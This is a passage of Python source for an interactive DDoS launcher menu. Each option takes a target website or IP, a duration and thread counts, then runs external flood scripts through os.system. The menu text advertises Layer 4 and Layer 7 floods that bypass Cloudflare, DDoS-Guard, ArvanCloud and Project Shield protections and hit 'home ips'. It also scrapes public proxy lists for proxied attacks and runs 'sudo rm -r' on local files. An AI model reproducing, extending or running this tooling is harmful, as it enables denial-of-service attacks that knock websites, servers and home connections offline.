                    couldbeslow = input("\033[31m\033[1m⮞ \033[0m\033[96mAttack could be slow. But when it starts hitting it destroys nearly everything!\033[31m:\033[36m\033[31m")
                    ultrabypassREQ = input("\033[31m\033[1m⮞\033[0m \033[96mThreads-Requests (minimum 5) and write it only in numbers without spaces \033[31m:\033[36m\033[31m")
                    sendultrabypassattack = ("node method.js " + ultrabypasswebsite + " " + ultrabypasstime + " request " + ultrabypassREQ)
                    tip()
                    
                    os.system(sendultrabypassattack)
                    

                    load()
                    license()
                    menu()
                if menuoption == "nuker-proxyless":
                    os.system('clear')
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[96mwebsite-nuker-https \033[31m: \033[36m Bypasses Anti DDOS Tunnels [CF], Destroys Target Verry Fast. Also Non CF. [HTTPS]\033[31m[\033[32mRUNNING\033[31m]\033[0m
    """)
                    websitenukerwebsite = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite (https://google.com)\033[31m:\033[36m\033[31m")
                    timewebsitenuker = input("\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m")
                    sendattackwebsitenuker = ("node website-nuker.js " + websitenukerwebsite + " " + timewebsitenuker)
                    tip()
                    
                    os.system(sendattackwebsitenuker)
                    
                    load()
                    license()
                    menu()
                if menuoption == "http-flood":
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mhttp-flood \033[31m: \033[36m Powerfull Layer 7 Attack: RAW ATTACK NO BYPASS \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    httpfloodweb = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                    httpfloodthreads = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(2000 minimal):\033[31m:\033[36m\033[31m")
                    httpmethod = input("\033[31m\033[1m⮞ \033[0m\033[96mpost or get?\033[31m:\033[36m\033[31m")
                    httptime = input("\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m")
                    mhgetsend = ('./httpflood ' + httpfloodweb + f' {httpfloodthreads}' + f' {httpmethod} {httptime} header.txt')
                    tip()
                
                    os.system(mhgetsend)

                    load()
                    license()
                    menu()
                if menuoption == "nuker-proxied":
                    os.system('clear')
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[96mwebsite-nuker-https-proxied \033[31m: \033[36m Proxied Attack, Bypasses Anti DDOS Tunnels [CF], Destroys Target Verry Fast. Also Non CF. [HTTPS]\033[31m[\033[32mRUNNING\033[31m]\033[0m
    """)
                    websitenukerwebsite1 = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite (https://google.com)\033[31m:\033[36m\033[31m")
                    timewebsitenuker1 = input("\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m")
                    sendattackwebsitenuker1 = ("node website-nuker.js " + websitenukerwebsite1 + " " + timewebsitenuker1)
                    tip()
                    
                    os.system(sendattackwebsitenuker1)
                    
                    load()
                    license()
                    menu()
                if menuoption == "exit":
                    sys.exit()
                if menuoption == "http-raw":
                    os.system('clear')
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[96mhttp-raw \033[31m: \033[36m Strong RAW ATTACK\033[31m[\033[32mRUNNING\033[31m]\033[0m
    """)
                    targetraw = input('\033[31m\033[1m⮞ \033[0m\033[96mWebsite \033[31m:\033[36m\033[31m')
                    rawtime = input('\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m')
                    sendrawhttp = ("node HTTP-RAW.js " + targetraw + " " + rawtime)
                    tip()
                    
                    os.system(sendrawhttp)
                   
                    
                    load()
                    license()
                    menu()
                else:
                    wrongoption()
                    license()
                    menu()
            if kies == "udp-god":
                os.system('clear')
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mudp-god \033[31m: \033[36m Strong Layer 4 Attack \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                udpIP = input("\033[31m\033[1m⮞ \033[0m\033[96mIP\033[31m:\033[36m\033[31m")
                udpTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m")
                sendUDP = (f'perl cocorisss.pl {udpIP} {udpTIME}')
                tip()
                os.system(sendUDP)
                load()
                license()
                menu()
            if kies == "mh-projectshield":
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-projectshield \033[31m: \033[36m Powerfull Layer 7 Attack: Bypass PROJECT SHIELD \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                mhgetsend = ('python3 start.py gsb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                tip()
                
                os.system(mhgetsend)
                
                load()
                license()
                menu()
            if kies == "mh-arvancloud":
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-arvancloud \033[31m: \033[36m Powerfull Layer 7 Attack: Bypass ARVAN CLOUD \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                mhgetsend = ('python3 start.py avb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                tip()
                
                os.system(mhgetsend)
                
                load()
                license()
                menu()
            if kies == "mh-even":
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-even \033[31m: \033[36m Powerfull Layer 7 Attack: EVEN \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                mhgetsend = ('python3 start.py even ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                tip()
                
                os.system(mhgetsend)
                load()
                license()
                menu()
            if kies == "mh-dyn":
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-dyn \033[31m: \033[36m Powerfull Layer 7 Attack: DYN \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                mhgetsend = ('python3 start.py dyn ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                tip()
                
                os.system(mhgetsend)
                
                load()
                license()
                menu()
            if kies == "mh-get":
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-get \033[31m: \033[36m Powerfull Layer 7 Attack: GET \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                mhgetsend = ('python3 start.py get ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                tip()
                
                os.system(mhgetsend)
                
                load()
                license()
                menu()
            if kies == "mh-post":
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-post \033[31m: \033[36m Powerfull Layer 7 Attack: POST\033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                mhgetsend = ('python3 start.py post ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                tip()
                
                os.system(mhgetsend)
                
                load()
                license()
                menu()
            if kies == "mh-ddosguard":
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-ddosguard \033[31m: \033[36m Powerfull Layer 7 Attack: Bypass DDOS GUARD \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                mhgetsend = ('python3 start.py dgb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                tip()
                
                os.system(mhgetsend)
                
                load()
                license()
                menu()
            if kies == "mh-cfbypass":
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-cfbypass \033[31m: \033[36m Powerfull Layer 7 Attack: Bypass CLOUDFLARE \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                mhgetsend = ('python3 start.py cfb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                tip()
               
                os.system(mhgetsend)
               
                load()
                license()
                menu()
            if kies == "mh-null":
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-null \033[31m: \033[36m Powerfull Layer 7 Attack: NULL \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                mhgetsend = ('python3 start.py null ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                tip()
                
                os.system(mhgetsend)
                
                load()
                license()
                menu()
            if kies == "http-flood":
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mhttp-flood \033[31m: \033[36m Powerfull Layer 7 Attack: RAW ATTACK NO BYPASS \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                httpfloodweb = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                httpfloodthreads = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(2000 minimal):\033[31m:\033[36m\033[31m")
                httpmethod = input("\033[31m\033[1m⮞ \033[0m\033[96mpost or get?\033[31m:\033[36m\033[31m")
                httptime = input("\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m")
                mhgetsend = ('./httpflood ' + httpfloodweb + f' {httpfloodthreads}' + f' {httpmethod} {httptime} header.txt')
                tip()
                
                os.system(mhgetsend)
               
                load()
                license()
                menu()
            if kies == "mh-normalbypass":
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-normalbypass \033[31m: \033[36m Powerfull Layer 7 Attack: Bypass normal anti ddos \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                mhgetsend = ('python3 start.py bypass ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                tip()
                
                os.system(mhgetsend)
               
                load()
                license()
                menu()
            if kies == "update":
                os.system('sudo rm -r darkness')
                update()
            if kies == "haven-god":
                os.system('clear')
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mhaven-god \033[31m: \033[36m Verry strong Layer 4 attack for websites, servers and home ips \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                havenip = input("\033[31m\033[1m⮞ \033[0m\033[96mIP\033[31m:\033[36m\033[31m")
                havensend = ('sudo ./haven -d ' + havenip)
                tip()
                
                os.system(havensend)
                
                load()
                license()
                menu()
            
            if kies == "proxy-crawl":
                os.system('clear')
                load()
                print("""
\033[36m[\033[39mTOOLS.x\033[36m]\033[0m

\033[31m\033[1m>\033[0m \033[39mproxy-crawl \033[31m: \033[36m crawl proxies\033[31m[\033[32mRUNNING\033[31m]\033[0m
\033[31m\033[1m>\033[0m \033[39m Option 1: \033[96mProxy Scraper IO Proxies\033[0m
\033[31m\033[1m>\033[0m \033[39m Option 2: \033[96mProxy List Proxies\033[0m


    """)
                qbro = input("\033[31m\033[1m>\033[0m \033[96mChoose from the options\033[31m\033[1m:\033[0m\033[96m  ")
                if qbro == "1":
                    os.system('sudo rm -r proxies.txt')
                    crawlPROXYHTTP = r.get(f"https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=7000")
                    textPROXIES = (crawlPROXYHTTP.text)
                    with open('proxies.txt', 'x') as file:
                        file.write(str(textPROXIES))
                        file.write('\n')
                        print(indicatorlogo + "Proxies saved in = proxies.txt\n\n")
                        gobackMENU = input(indicatorlogo + "Go back to menu (y/n):")
                        if gobackMENU == "n":
                                sys.exit()
                        else:
                            load()
                            license()
                            menu()
                if qbro == "2":
                    os.system('sudo rm -r proxies.txt')
                    crawlPROXYHTTP = r.get(f"https://www.proxy-list.download/api/v1/get?type=http")
                    textPROXIES = (crawlPROXYHTTP.text)
                    with open('proxies.txt', 'x') as file:
                        file.write(str(textPROXIES))
                        file.write('\n')
                        print(indicatorlogo + "Proxies saved in = proxies.txt\n\n")
                        gobackMENU = input(indicatorlogo + "Go back to menu (y/n):")
                        if gobackMENU == "n":
                            sys.exit()
                        else:
                            load()
                            license()
                            menu()
            
            if kies == "ultra-bypass":
                os.system('clear')
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39multra-bypass \033[31m: \033[36m Bypasses Blazingfast, DDOS Guard, (js) StormWall , OVH UAM & Cloudflare UAM & Also normal hit could be done \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                ultrabypasswebsite = input("\033[31m\033[1m⮞ \033[0m\033[96mWEBSITE (https://google.com) \033[31m:\033[36m\033[31m")
                ultrabypasstime = input("\033[31m\033[1m⮞ \033[0m\033[96mTIME(seconds) \033[31m:\033[36m\033[31m")
                couldbeslow = input("\033[31m\033[1m⮞ \033[0m\033[96mAttack could be slow. But when it starts hitting it destroys nearly everything!\033[31m:\033[36m\033[31m")
                ultrabypassREQ = input("\033[31m\033[1m⮞\033[0m \033[96mThreads-Requests (minimum 5) and write it only in numbers without spaces \033[31m:\033[36m\033[31m")
                sendultrabypassattack = ("node method.js " + ultrabypasswebsite + " " + ultrabypasstime + " request " + ultrabypassREQ)
                tip()
                
                os.system(sendultrabypassattack)
                

                load()
                license()
                menu()
            if kies == "nuker-proxyless":
                os.system('clear')
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[96mwebsite-nuker-https \033[31m: \033[36m Bypasses Anti DDOS Tunnels [CF], Destroys Target Verry Fast. Also Non CF. [HTTPS]\033[31m[\033[32mRUNNING\033[31m]\033[0m
    """)
                websitenukerwebsite = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite (https://google.com)\033[31m:\033[36m\033[31m")
                timewebsitenuker = input("\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m")
                sendattackwebsitenuker = ("node website-nuker.js " + websitenukerwebsite + " " + timewebsitenuker)
                tip()
                
                os.system(sendattackwebsitenuker)
                

                load()
                license()
                menu()
            if kies == "nuker-proxied":
                os.system('clear')
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[96mwebsite-nuker-https-proxied \033[31m: \033[36m Proxied Attack, Bypasses Anti DDOS Tunnels [CF], Destroys Target Verry Fast. Also Non CF. [HTTPS]\033[31m[\033[32mRUNNING\033[31m]\033[0m
    """)
                websitenukerwebsite1 = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite (https://google.com)\033[31m:\033[36m\033[31m")
                timewebsitenuker1 = input("\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m")
                sendattackwebsitenuker1 = ("node website-nuker.js " + websitenukerwebsite1 + " " + timewebsitenuker1)
                tip()
                



                
                os.system(sendattackwebsitenuker1)
                
                load()
                license()
                menu()
            if kies == "http-raw":
                os.system('clear')
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[96mhttp-raw \033[31m: \033[36m Strong RAW ATTACK\033[31m[\033[32mRUNNING\033[31m]\033[0m
    """)
                targetraw = input('\033[31m\033[1m⮞ \033[0m\033[96mWebsite \033[31m:\033[36m\033[31m')
                rawtime = input('\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m')
                sendrawhttp = ("node HTTP-RAW.js " + targetraw + " " + rawtime)
                tip()
                
                os.system(sendrawhttp)
                

                load()
                license()
                menu()

            if kies == "fixer":
                os.system('./fixer')
            if kies == "exit":
                sys.exit()
            else:
                wrongoption()
                load()
                license()
                menu()
    except KeyboardInterrupt:
        print('Keyboard Interruption')
        load()
        license()
        menu()
    except EOFError:
        print('EOF Error')
        load()
        license()
        menu()
    except IndexError:
        print('Index Error')
        load()
        license()
        menu()
    except FileExistsError:
        print("Error")
        load()
        license()
        menu()

menu()
